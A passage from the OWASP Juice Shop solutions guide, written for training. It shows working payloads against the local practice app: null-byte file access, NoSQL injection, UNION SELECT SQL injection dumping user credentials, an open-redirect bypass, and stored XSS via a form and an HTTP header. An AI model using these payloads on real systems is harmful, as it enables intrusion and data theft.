<p>Opening <a href="http://localhost:3000/ftp/package.json.bak" class="bare">http://localhost:3000/ftp/package.json.bak</a> directly will
fail complaining about an illegal file type.</p>
</li>
<li>
<p>Using a <em>Poison Null Byte</em> (<code>%00</code>) the filter can be tricked, but
only with a twist:</p>
<div class="ulist">
<ul>
<li>
<p>Accessing <a href="http://localhost:3000/ftp/package.json.bak%00.md" class="bare">http://localhost:3000/ftp/package.json.bak%00.md</a> will
surprisingly <strong>not</strong> succeed&#8230;&#8203;</p>
</li>
<li>
<p>&#8230;&#8203;because the <code>%</code> character needs to be URL-encoded (into <code>%25</code>)
as well in order to work its magic later during the file system
access.</p>
</li>
</ul>
</div>
</li>
<li>
<p><a href="http://localhost:3000/ftp/package.json.bak%2500.md" class="bare">http://localhost:3000/ftp/package.json.bak%2500.md</a> will ultimately
solve the challenge.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_access_a_salesmans_forgotten_backup_file"><a class="anchor" href="#_access_a_salesmans_forgotten_backup_file"></a>Access a salesman&#8217;s forgotten backup file</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Use the <em>Poison Null Byte</em> attack described in
<a href="#access-a-developers-forgotten-backup-file">Access a developer&#8217;s forgotten backup file</a>&#8230;&#8203;</p>
</li>
<li>
<p>&#8230;&#8203;to download
<a href="http://localhost:3000/ftp/coupons_2013.md.bak%2500.md" class="bare">http://localhost:3000/ftp/coupons_2013.md.bak%2500.md</a></p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_log_in_with_bjoerns_gmail_account"><a class="anchor" href="#_log_in_with_bjoerns_gmail_account"></a>Log in with Bjoern&#8217;s Gmail account</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Bjoern has registered via Google OAuth with his (real) account
<a href="mailto:bjoern.kimminich@googlemail.com">bjoern.kimminich@googlemail.com</a>.</p>
</li>
<li>
<p>Cracking his password hash will probably not work.</p>
</li>
<li>
<p>To find out how the OAuth registration and login work, inspect the
<code>main.js</code> and search for <code>oauth</code>, which will eventually reveal
a function <code>userService.oauthLogin()</code>.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/minified_js-oauth.png" alt="oauthLogin function in main.js">
</div>
</div>
</li>
<li>
<p>In the function body you will notice a call to <code>userService.save()</code> -
which is used to create a user account in the non-Google <em>User
Registration</em> process - followed by a call to the regular
<code>userService.login()</code></p>
</li>
<li>
<p>The <code>save()</code> and <code>login()</code> function calls both leak how the password
for the account is set: <code>password:
btoa(n.email.split("").reverse().join(""))</code></p>
</li>
<li>
<p>Some Internet search will reveal that <code>window.btoa()</code> is a default
function to encode strings into Base64.</p>
</li>
<li>
<p>What is passed into <code>btoa()</code> is <code>email.split("").reverse().join("")</code>,
which is simply the email address string reversed.</p>
</li>
<li>
<p>Now all you have to do is Base64-encode <code>moc.liamg@hcinimmik.nreojb</code>,
so you can log in directly with <em>Email</em> <code>bjoern.kimminich@gmail.com</code>
and <em>Password</em> <code>bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=</code>.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_steal_someone_elses_personal_data_without_using_injection"><a class="anchor" href="#_steal_someone_elses_personal_data_without_using_injection"></a>Steal someone else&#8217;s personal data without using Injection</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Log in as any user, put some items into your basket and create an
order from these.</p>
</li>
<li>
<p>Notice that you end up on a URL with a seemingly generated random part, like <a href="http://localhost:3000/#/order-completion/5267-829f123593e9d098" class="bare">http://localhost:3000/#/order-completion/5267-829f123593e9d098</a></p>
</li>
<li>
<p>On that <em>Order Summary</em> page, click on the <em>Track Orders</em> link under the <em>Thank you for your purchase!</em> message to end up on a URL simular to <a href="http://localhost:3000/#/track-result/new?id=5267-829f123593e9d098" class="bare">http://localhost:3000/#/track-result/new?id=5267-829f123593e9d098</a></p>
</li>
<li>
<p>Open the network tab of your browser&#8217;s DevTools and refresh that page. You should notice a request similar
to <a href="http://localhost:3000/rest/track-order/5267-829f123593e9d098" class="bare">http://localhost:3000/rest/track-order/5267-829f123593e9d098</a>.</p>
</li>
<li>
<p>Inspecting the response closely, you might notice that the user email
address is partially obfuscated:
<code>{"status":"success","data":[{"orderId":"5267-829f123593e9d098","email":"*dm*n@j**c*-sh.*p","totalPrice":2.88,"products":[{"quantity":1,"name":"Apple
Juice
(1000ml)","price":1.99,"total":1.99,"bonus":0},{"quantity":1,"name":"Apple
Pomace","price":0.89,"total":0.89,"bonus":0}],"bonus":0,"eta":"2","_id":"tosmfPsDaWcEnzRr3"}]}</code></p>
</li>
<li>
<p>It looks like certain letters - seemingly all vowels - were replaced
with <code>*</code> characters before the order was stored in the database.</p>
</li>
<li>
<p>Register a new user with an email address that would result in <em>the
exact same</em> obfuscated email address. For example register
<code>edmin@juice-sh.op</code> to steal the data of <code>admin@juice-sh.op</code>.</p>
</li>
<li>
<p>Log in with your new user and immediately get your data exported via
<a href="http://localhost:3000/#/privacy-security/data-export" class="bare">http://localhost:3000/#/privacy-security/data-export</a>.</p>
</li>
<li>
<p>You will notice that the order belonging to the existing user
<code>admin@juice-sh.op</code> (in this example <code>5267-829f123593e9d098</code>) is part
of your new user&#8217;s data export due to the clash when obfuscating
emails!</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_access_a_misplaced_siem_signature_file"><a class="anchor" href="#_access_a_misplaced_siem_signature_file"></a>Access a misplaced SIEM signature file</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Use the <em>Poison Null Byte</em> attack described in
<a href="#access-a-developers-forgotten-backup-file">Access a developer&#8217;s forgotten backup file</a>&#8230;&#8203;</p>
</li>
<li>
<p>&#8230;&#8203;to download
<a href="http://localhost:3000/ftp/suspicious_errors.yml%2500.md" class="bare">http://localhost:3000/ftp/suspicious_errors.yml%2500.md</a></p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_let_the_server_sleep_for_some_time"><a class="anchor" href="#_let_the_server_sleep_for_some_time"></a>Let the server sleep for some time</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>You can interact with the backend API for product reviews via the
dedicated endpoints <code>/rest/products/reviews</code> and
<code>/rest/products/{id}/reviews</code></p>
</li>
<li>
<p>Get the reviews of the product with database ID 1:
<a href="http://localhost:3000/rest/products/1/reviews" class="bare">http://localhost:3000/rest/products/1/reviews</a></p>
</li>
<li>
<p>Inject a
<a href="https://docs.mongodb.com/manual/reference/method/sleep/"><code>sleep(integer ms)</code> command</a>
by changing the URL into
<a href="http://localhost:3000/rest/products/sleep(2000)/reviews" class="bare">http://localhost:3000/rest/products/sleep(2000)/reviews</a> to solve the
challenge</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>To avoid <em>real</em> Denial-of-Service (DoS) issues, the Juice Shop will only
wait for a maximum of 2 seconds, so
<a href="http://localhost:3000/rest/products/sleep(999999)/reviews" class="bare">http://localhost:3000/rest/products/sleep(999999)/reviews</a> should not
take longer than <a href="http://localhost:3000/rest/products/sleep(2000)/reviews" class="bare">http://localhost:3000/rest/products/sleep(2000)/reviews</a>
to respond.</p>
</div>
</div>
<div class="sect2">
<h3 id="_update_multiple_product_reviews_at_the_same_time"><a class="anchor" href="#_update_multiple_product_reviews_at_the_same_time"></a>Update multiple product reviews at the same time</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Log in as any user to get your <code>Authorization</code> token from any
subsequent request&#8217;s headers.</p>
</li>
<li>
<p>Submit a PATCH request to <a href="http://localhost:3000/rest/products/reviews" class="bare">http://localhost:3000/rest/products/reviews</a>
with</p>
<div class="ulist">
<ul>
<li>
<p><code>{ "id": { "$ne": -1 }, "message": "NoSQL Injection!" }</code> as body</p>
</li>
<li>
<p><code>application/json</code> as <code>Content-Type</code> header.</p>
</li>
<li>
<p>and <code>Bearer ?</code> as <code>Authorization</code> header, replacing the <code>?</code> with
the token you received in step 1.</p>
</li>
</ul>
</div>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/nosql_multiple-reviews-updated.png" alt="Multiple review updated via NoSQL Injection">
</div>
</div>
</li>
<li>
<p>Check different product detail dialogs to verify that <em>all review
texts</em> have been changed into <code>NoSQL Injection!</code></p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_enforce_a_redirect_to_a_page_you_are_not_supposed_to_redirect_to"><a class="anchor" href="#_enforce_a_redirect_to_a_page_you_are_not_supposed_to_redirect_to"></a>Enforce a redirect to a page you are not supposed to redirect to</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Pick one of the redirect links in the application, e.g.
<a href="http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop" class="bare">http://localhost:3000/redirect?to=https://github.com/juice-shop/juice-shop</a>
from the <em>GitHub</em>-button in the navigation bar.</p>
</li>
<li>
<p>Trying to redirect to some unrecognized URL fails due to allowlist
validation with <code>406 Error: Unrecognized target URL for redirect</code>.</p>
</li>
<li>
<p>Removing the <code>to</code> parameter (<a href="http://localhost:3000/redirect" class="bare">http://localhost:3000/redirect</a>) will
instead yield a <code>500 TypeError: Cannot read property 'indexOf' of
undefined</code> where the <code>indexOf</code> indicates a severe flaw in the way the
allowlist works.</p>
</li>
<li>
<p>Craft a redirect URL so that the target-URL in <code>to</code> comes with an own
parameter containing a URL from the allowlist, e.g.
<a href="http://localhost:3000/redirect?to=http://kimminich.de?pwned=https://github.com/juice-shop/juice-shop" class="bare">http://localhost:3000/redirect?to=http://kimminich.de?pwned=https://github.com/juice-shop/juice-shop</a></p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_bypass_a_security_control_with_a_poison_null_byte"><a class="anchor" href="#_bypass_a_security_control_with_a_poison_null_byte"></a>Bypass a security control with a Poison Null Byte</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Solve
<a href="#access-a-developers-forgotten-backup-file">Access a developer&#8217;s forgotten backup file</a>,
<a href="#access-a-salesmans-forgotten-backup-file">Access a salesman&#8217;s forgotten backup file</a>,
<a href="#access-a-misplaced-siem-signature-file">Access a misplaced SIEM signature file</a>
or <a href="#find-the-hidden-easter-egg">Find the hidden easter egg</a> to solve
this challenge as a by-product.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_reset_benders_password_via_the_forgot_password_mechanism"><a class="anchor" href="#_reset_benders_password_via_the_forgot_password_mechanism"></a>Reset Bender&#8217;s password via the Forgot Password mechanism</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Trying to find out who "Bender" might be should <em>immediately</em> lead
you to <em>Bender from <a href="http://www.imdb.com/title/tt0149460/">Futurama</a></em>
as the only viable option</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/Bender_Rodriguez.png" alt="Bender">
</div>
</div>
</li>
<li>
<p>Visit <a href="https://en.wikipedia.org/wiki/Bender_(Futurama" class="bare">https://en.wikipedia.org/wiki/Bender_(Futurama</a>) and read the
<em>Character Biography</em> section</p>
</li>
<li>
<p>It tells you that Bender had a job at the metalworking factory,
bending steel girders for the construction of <em>suicide booths</em>.</p>
</li>
<li>
<p>Find out more on <em>Suicide Booths</em> on
<a href="http://futurama.wikia.com/wiki/Suicide_booth" class="bare">http://futurama.wikia.com/wiki/Suicide_booth</a></p>
</li>
<li>
<p>This site tells you that their most important brand is <em>Stop&#8217;n&#8217;Drop</em></p>
</li>
<li>
<p>Visit <a href="http://localhost:3000/#/forgot-password" class="bare">http://localhost:3000/#/forgot-password</a> and provide
<code>bender@juice-sh.op</code> as your <em>Email</em></p>
</li>
<li>
<p>In the subsequently appearing form, provide <code>Stop&#8217;n&#8217;Drop</code> as <em>Company
you first work for as an adult?</em></p>
</li>
<li>
<p>Then type any <em>New Password</em> and matching <em>Repeat New Password</em></p>
</li>
<li>
<p>Click <em>Change</em> to solve this challenge</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_reset_uvogins_password_via_the_forgot_password_mechanism"><a class="anchor" href="#_reset_uvogins_password_via_the_forgot_password_mechanism"></a>Reset Uvogin&#8217;s password via the Forgot Password mechanism</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>To reset Uvogin&#8217;s password, you need the to find out what his
favorite movie is in order to answer his security question. This is
the kind of information that people often carelessly expose online.</p>
</li>
<li>
<p>People often tend to reuse aliases on different websites.
<a href="https://github.com/sherlock-project/sherlock">Sherlock</a> is a great
tool for finding social media accounts with known aliases/pesudonyms.</p>
</li>
<li>
<p>Unfortunately, plugging <em>uvogin</em> into sherlock yields nothing of
interest. Reading the reviews left by uvogin on the various products,
one can notice that they have quite an affinity for <em>leetspeak</em></p>
</li>
<li>
<p>Trying out a few variations of the alias uvogin, <em>uv0gin</em> leads us to
a twitter account with a similarly written tweet which references a
vulnerable beverage store. However nothing about his favorite movie</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/uvogin_twitter.png" alt="Uvogin&#8217;s Twitter">
</div>
</div>
</li>
<li>
<p>The <a href="https://archive.org/web/">WayBack</a> can be used to check for
older versions of their profile page to look for deleted tweets. And
indeed, one of the snapshots available on WayBack contains a deleted
tweet that references <code>Silence of the Lambs</code> which is infact the
correct answer to his security question</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/uvogin_twitter_snap.png" alt="Uvogin&#8217;s Twitter Snapshot">
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_rat_out_a_notorious_character_hiding_in_plain_sight_in_the_shop"><a class="anchor" href="#_rat_out_a_notorious_character_hiding_in_plain_sight_in_the_shop"></a>Rat out a notorious character hiding in plain sight in the shop</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Looking for irregularities among the image files you will at some
point notice that <code>5.png</code> is the only PNG file among otherwise only
JPGs in the customer feedback carousel:</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/steganography.png" alt="Steganography customer support image">
</div>
</div>
</li>
<li>
<p>Running this image through some decoders available online will
probably just return garbage, e.g.
<a href="http://stylesuxx.github.io/steganography/" class="bare">http://stylesuxx.github.io/steganography/</a> gives you <code>ÿÁÿm¶Û$ÿ
?HÕPü^ÛN'c±UY;fäHÜmÉ#r&lt;v¸</code> or
<a href="https://www.mobilefish.com/services/steganography/steganography.php" class="bare">https://www.mobilefish.com/services/steganography/steganography.php</a>
gives up with <code>No hidden message or file found in the image</code>. On
<a href="https://incoherency.co.uk/image-steganography/#unhide" class="bare">https://incoherency.co.uk/image-steganography/#unhide</a> you will also
find nothing independent of how you set the <em>Hidden bits</em> slider:</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/steganography_failed-unhide.png" alt="Steganography unhiding fails">
</div>
</div>
</li>
<li>
<p>Moving on to client applications you might end up with
<a href="https://www.openstego.com/">OpenStego</a> which is built in Java but
also offers a Windows installer at
<a href="https://github.com/syvaidya/openstego/releases" class="bare">https://github.com/syvaidya/openstego/releases</a>.</p>
</li>
<li>
<p>Selecting the <code>5.png</code> and clicking <em>Extract Data</em> OpenStego will
quickly claim to have been successful:</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/steganography_openstego-success.png" alt="Steganography exctraction successful">
</div>
</div>
</li>
<li>
<p>The image that will be put into the <em>Output Stego file</em> location
clearly depicts a pixelated version of
<a href="https://en.wikipedia.org/wiki/Pickle_Rick">Pickle Rick</a> (from S3E3 -
one of the best
<a href="https://en.wikipedia.org/wiki/Rick_and_Morty">Rick &amp; Morty</a> episodes
ever)</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/steganography_pickle-rick.png" alt="Pickle Rick unveiled">
</div>
</div>
</li>
<li>
<p>Visit <a href="http://localhost:3000/#/contact" class="bare">http://localhost:3000/#/contact</a></p>
</li>
<li>
<p>Submit your feedback containing the name <code>Pickle Rick</code> (case doesn&#8217;t
matter) to solve this challenge.</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_inform_the_shop_about_a_typosquatting_trick_it_has_been_a_victim_of"><a class="anchor" href="#_inform_the_shop_about_a_typosquatting_trick_it_has_been_a_victim_of"></a>Inform the shop about a typosquatting trick it has been a victim of</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Solve the
<a href="#access-a-developers-forgotten-backup-file">Access a developer&#8217;s forgotten backup file</a>
challenge and open the <code>package.json.bak</code> file</p>
</li>
<li>
<p>Scrutinizing each entry in the <code>dependencies</code> list you will at some
point get to <code>epilogue-js</code>, the overview page of which gives away
that you find the culprit at
<a href="https://www.npmjs.com/package/epilogue-js" class="bare">https://www.npmjs.com/package/epilogue-js</a></p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/npm_epilogue-js.png" alt="epilogue-js on NPM">
</div>
</div>
</li>
<li>
<p>Visit <a href="http://localhost:3000/#/contact" class="bare">http://localhost:3000/#/contact</a></p>
</li>
<li>
<p>Submit your feedback with <code>epilogue-js</code> in the comment to solve this
challenge</p>
</li>
</ol>
</div>
<div class="paragraph">
<p>You can probably imagine that the typosquatted <code>epilogue-js</code> would be <em>a
lot harder</em> to distinguish from the original repository <code>epilogue</code>, if
it where not marked with the <em>THIS IS <strong>NOT</strong> THE MODULE YOU ARE LOOKING
FOR!</em>-warning at the very top. Below you can see the original <code>epilogue</code>
NPM page:</p>
</div>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/npm_epilogue.png" alt="epilogue on NPM">
</div>
</div>
</div>
<div class="sect2">
<h3 id="_retrieve_a_list_of_all_user_credentials_via_sql_injection"><a class="anchor" href="#_retrieve_a_list_of_all_user_credentials_via_sql_injection"></a>Retrieve a list of all user credentials via SQL Injection</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>During the
<a href="#order-the-christmas-special-offer-of-2014">Order the Christmas special offer of 2014</a>
challenge you learned that the <code>/rest/products/search</code> endpoint is
susceptible to SQL Injection into the <code>q</code> parameter.</p>
</li>
<li>
<p>The attack payload you need to craft is a <code>UNION SELECT</code> merging the
data from the user&#8217;s DB table into the products returned in the JSON
result.</p>
</li>
<li>
<p>As a starting point we use the known working <code>'))--</code> attack pattern
and try to make a <code>UNION SELECT</code> out of it</p>
</li>
<li>
<p>Searching for <code>')) UNION SELECT * FROM x--</code> fails with a
<code>SQLITE_ERROR: no such table: x</code> as you would expect. But we can
easily guess the table name or infer it from one of the previous
attacks on the <em>Login</em> form where even the underlying SQL query was
leaked.</p>
</li>
<li>
<p>Searching for <code>')) UNION SELECT * FROM Users--</code> fails with a
promising <code>SQLITE_ERROR: SELECTs to the left and right of UNION do
not have the same number of result columns</code> which least confirms the
table name.</p>
</li>
<li>
<p>The next step in a <code>UNION SELECT</code>-attack is typically to find the
right number of returned columns. As the <em>Search Results</em> table in
the UI has 3 columns displaying data, it will probably at least be
three. You keep adding columns until no more <code>SQLITE_ERROR</code> occurs
(or at least it becomes a different one):</p>
<div class="olist loweralpha">
<ol class="loweralpha" type="a">
<li>
<p><code>')) UNION SELECT '1' FROM Users--</code> fails with <code>number of result
columns</code> error</p>
</li>
<li>
<p><code>')) UNION SELECT '1', '2' FROM Users--</code> fails with <code>number of
result columns</code> error</p>
</li>
<li>
<p><code>')) UNION SELECT '1', '2', '3' FROM Users--</code> fails with <code>number
of result columns</code> error</p>
</li>
<li>
<p>(&#8230;&#8203;)</p>
</li>
<li>
<p><code>')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8' FROM
Users--</code> <em>still fails</em> with <code>number of result columns</code> error</p>
</li>
<li>
<p><code>')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM
Users--</code> finally gives you a JSON response back with an extra
element
<code>{"id":"1","name":"2","description":"3","price":"4","deluxePrice":"5","image":"6","createdAt":"7","updatedAt":"8","deletedAt":"9"}</code>.</p>
</li>
</ol>
</div>
</li>
<li>
<p>Next you get rid of the unwanted product results changing the query
into something like <code>qwert')) UNION SELECT '1', '2', '3', '4', '5',
'6', '7', '8', '9' FROM Users--</code> leaving only the "<code>UNION</code>ed" element
in the result set</p>
</li>
<li>
<p>The last step is to replace the fixed values with correct column
names. You could guess those <strong>or</strong> derive them from the RESTful API
results <strong>or</strong> remember them from previously seen SQL errors while
attacking the <em>Login</em> form.</p>
</li>
<li>
<p>Searching for <code>qwert')) UNION SELECT id, email, password, '4', '5',
'6', '7', '8', '9' FROM Users--</code> solves the challenge giving you a
the list of all user data in convenient JSON format.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/union_select-attack_result.png" alt="User list from UNION SELECT attack">
</div>
</div>
</li>
</ol>
</div>
<div class="paragraph">
<p>There is of course a much easier way to retrieve a list of all users as
long as you are logged in: Open <a href="http://localhost:3000/#/administration" class="bare">http://localhost:3000/#/administration</a>
while monitoring the HTTP calls in your browser&#8217;s developer tools. The
response to <a href="http://localhost:3000/rest/user/authentication-details" class="bare">http://localhost:3000/rest/user/authentication-details</a>
also contains the user data in JSON format. But: This list has all the
password hashes replaced with <code>*</code>-symbols, so it does not count as a
solution for this challenge.</p>
</div>
</div>
<div class="sect2">
<h3 id="_inform_the_shop_about_a_vulnerable_library_it_is_using"><a class="anchor" href="#_inform_the_shop_about_a_vulnerable_library_it_is_using"></a>Inform the shop about a vulnerable library it is using</h3>
<div class="paragraph">
<p>Juice Shop depends on a JavaScript library with known vulnerabilities.
Having the <code>package.json.bak</code> and using an online vulnerability database
like <a href="https://retirejs.github.io/">Retire.js</a> or a CLI tool like
<a href="https://docs.npmjs.com/cli/audit/">npm-audit</a> that comes with Node.js, makes it rather easy to identify it.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Solve
<a href="../part2/sensitive-data-exposure.md#access-a-developers-forgotten-backup-file">Access a developer&#8217;s forgotten backup file</a></p>
</li>
<li>
<p>Checking the dependencies in <code>package.json.bak</code> for known
vulnerabilities online will give you a match (at least) for</p>
<div class="ulist">
<ul>
<li>
<p><code>sanitize-html</code>: Sanitization of HTML strings is not applied
recursively to input, allowing an attacker to potentially inject
script and other markup (see
<a href="https://github.com/advisories/GHSA-3j7m-hmh3-9jmp" class="bare">https://github.com/advisories/GHSA-3j7m-hmh3-9jmp</a>)</p>
</li>
<li>
<p><code>express-jwt</code>: Inherits a JWT verification bypass and other
vulnerabilities from its dependencies (see
<a href="https://github.com/advisories/GHSA-c7hr-j4mj-j2w6" class="bare">https://github.com/advisories/GHSA-c7hr-j4mj-j2w6</a>)</p>
</li>
</ul>
</div>
</li>
<li>
<p>Visit <a href="http://localhost:3000/#/contact" class="bare">http://localhost:3000/#/contact</a></p>
<div class="olist loweralpha">
<ol class="loweralpha" type="a">
<li>
<p>Submit your feedback with the string pair <code>sanitize-html</code> and
<code>1.4.2</code> appearing somewhere in the comment. Alternatively you can
submit <code>express-jwt</code> and <code>0.1.3</code>.</p>
</li>
</ol>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_perform_a_persisted_xss_attack_bypassing_a_server_side_security_mechanism"><a class="anchor" href="#_perform_a_persisted_xss_attack_bypassing_a_server_side_security_mechanism"></a>Perform a persisted XSS attack bypassing a server-side security mechanism</h3>
<div class="paragraph">
<p>In the <code>package.json.bak</code> you might have noticed the pinned dependency
<code>"sanitize-html": "1.4.2"</code>. Internet research will yield a reported
<a href="https://github.com/advisories/GHSA-3j7m-hmh3-9jmp">Cross-site Scripting (XSS)</a>
vulnerability, which was fixed with version 1.4.3 - one release later
than used by the Juice Shop. The referenced
<a href="https://github.com/apostrophecms/sanitize-html/issues/29">GitHub issue</a>
explains the problem and gives an exploit example:</p>
</div>
<div class="quoteblock">
<blockquote>
<div class="paragraph">
<p>Sanitization is not applied recursively, leading to a vulnerability to
certain masking attacks. Example:</p>
</div>
<div class="paragraph">
<p><code>I am not harmless: &lt;&lt;img src="csrf-attack"/&gt;img src="csrf-attack"/&gt;</code>
is sanitized to <code>I am not harmless: &lt;img src="csrf-attack"/&gt;</code></p>
</div>
<div class="paragraph">
<p>Mitigation: Run sanitization recursively until the input html matches
the output html.</p>
</div>
</blockquote>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Visit <a href="http://localhost:3000/#/contact" class="bare">http://localhost:3000/#/contact</a>.</p>
</li>
<li>
<p>Enter <code>&lt;&lt;script&gt;Foo&lt;/script&gt;iframe src="javascript:alert(`xss</code>)"&gt;` as
<em>Comment</em></p>
</li>
<li>
<p>Choose a rating and click <em>Submit</em></p>
</li>
<li>
<p>Visit <a href="http://localhost:3000/#/about" class="bare">http://localhost:3000/#/about</a> for a first "xss" alert (from the
<em>Customer Feedback</em> slideshow)</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/xss4_alert.png" alt="XSS alert box">
</div>
</div>
</li>
<li>
<p>Visit <a href="http://localhost:3000/#/administration" class="bare">http://localhost:3000/#/administration</a> for a second "xss" alert
(from the <em>Customer Feedback</em> table)</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/xss4_alert-admin.png" alt="XSS alert box in admin area">
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_perform_a_persisted_xss_attack_through_an_http_header"><a class="anchor" href="#_perform_a_persisted_xss_attack_through_an_http_header"></a>Perform a persisted XSS attack through an HTTP header</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Log in as any user.</p>
</li>
<li>
<p>Visit <a href="http://localhost:3000/#/privacy-security/last-login-ip" class="bare">http://localhost:3000/#/privacy-security/last-login-ip</a> where
your <em>IP Address</em> probably shows as <code>0.0.0.0</code>.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/normal_lastLoginIp.png" alt="Normal Last Login IP address">
</div>
</div>
</li>
<li>
<p>Log out and then log in again with the same user as before.</p>
</li>
<li>
<p>Visit <a href="http://localhost:3000/#/privacy-security/last-login-ip" class="bare">http://localhost:3000/#/privacy-security/last-login-ip</a> again
where your <em>IP Address</em> should now show your actual remote IP address
(or <code>127.0.0.1</code> if you run the application locally).</p>
</li>
<li>
<p>Find the request to <a href="https://localhost:3000/rest/saveLoginIp" class="bare">https://localhost:3000/rest/saveLoginIp</a> in your
Browser DevTools.</p>
</li>
<li>
<p>Replay the request after adding the <code>X-Forwarded-For</code> HTTP header to
spoof an arbitrary IP, e.g. <code>1.2.3.4</code>.</p>
</li>
<li>
<p>Unfortunately in the response (and also on
<a href="http://localhost:3000/#/privacy-security/last-login-ip" class="bare">http://localhost:3000/#/privacy-security/last-login-ip</a> after
logging in again) you will still find your remote IP as before</p>
</li>
<li>
<p>Repeat step 6. only with the proprietary header <code>True-Client-IP</code>.</p>
</li>
<li>
<p>In the JSON response you will notice <code>lastLoginIp: "1.2.3.4"</code> and
after logging in again you will see <code>1.2.3.4</code> as your <em>IP Address</em> on
<a href="http://localhost:3000/#/privacy-security/last-login-ip" class="bare">http://localhost:3000/#/privacy-security/last-login-ip</a>.</p>
</li>
<li>
<p>Replay the request once more with <code>True-Client-IP: &lt;iframe
src="javascript:alert(<code>xss</code>)"&gt;</code> to solve this seriously obscure
challenge.</p>
</li>
<li>
<p>Log in again and visit
<a href="http://localhost:3000/#/privacy-security/last-login-ip" class="bare">http://localhost:3000/#/privacy-security/last-login-ip</a> see the
alert popup.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/xss5_lastLoginIp.png" alt="XSS in Last Login IP address">
</div>
</div>
</li>
</ol>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="_challenges_5"><a class="anchor" href="#_challenges_5"></a>⭐⭐⭐⭐⭐ Challenges</h2>
<div class="sectionbody">
<div class="sect2">
<h3 id="_learn_about_the_token_sale_before_its_official_announcement"><a class="anchor" href="#_learn_about_the_token_sale_before_its_official_announcement"></a>Learn about the Token Sale before its official announcement</h3>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Open the <code>main.js</code> in your browser&#8217;s developer tools and
search for some keywords like "ico", "token", "bitcoin" or "altcoin".</p>
</li>
<li>
<p>Note the names of the JavaScript functions where these occur in, like
<code>Vu()</code> and <code>Hu(l)</code>. These names are obfuscated, so they might be
different for you.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/minified_js-tokensale.png" alt="Obfuscated token sale related functions in main.js">
</div>
</div>
</li>
<li>
<p>Searching for references to those functions in <code>main.js</code> might
yield some more functions, like <code>zu(l)</code> and some possible route name
<code>app-token-sale</code></p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/minified_js-tokensale_trail.png" alt="More token sale related functions in main.js">
</div>
</div>
</li>
<li>
<p>Navigate to <a href="http://localhost:3000/" class="bare">http://localhost:3000/</a><mark>/app-token-sale or variations
like <a href="http://localhost:3000/" class="bare">http://localhost:3000/</a></mark>/token-sale just to realize that these
routes do not exist.</p>
</li>
<li>
<p>After some more chasing through the minified code, you should realize
that <code>Vu</code> is referenced in the route mappings that already helped
with
<a href="#find-the-carefully-hidden-score-board-page">Find the carefully hidden 'Score Board' page</a>
and
<a href="#access-the-administration-section-of-the-store">Access the administration section of the store</a>
but not to a static title. It is mapped to another variable <code>Ca</code>
(which might be named differently for you)</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/minified_js-tokensale_route.png" alt="Tokensale route mapping in main.js">
</div>
</div>
</li>
<li>
<p>Search for <code>function Ca(</code> to find the declaration of the function
that should return a matcher to the route name you are looking for.</p>
<div class="imageblock">
<div class="content">
<img src="../_images/appendix/minified_js-tokensale_matcher.png" alt="Tokensale route matcher in main.js">
</div>
</div>
</li>
<li>
<p>Copy the obfuscating function into the JavaScript console of your
browser and execute it immediately by appending a <code>()</code>. This will
probably yield a <code>Uncaught SyntaxError: Unexpected token )</code>. When you
pass values in, like <code>(1)</code> or <code>('a')</code> you will notice that the input
value is simply returned.</p>
</li>
<li>
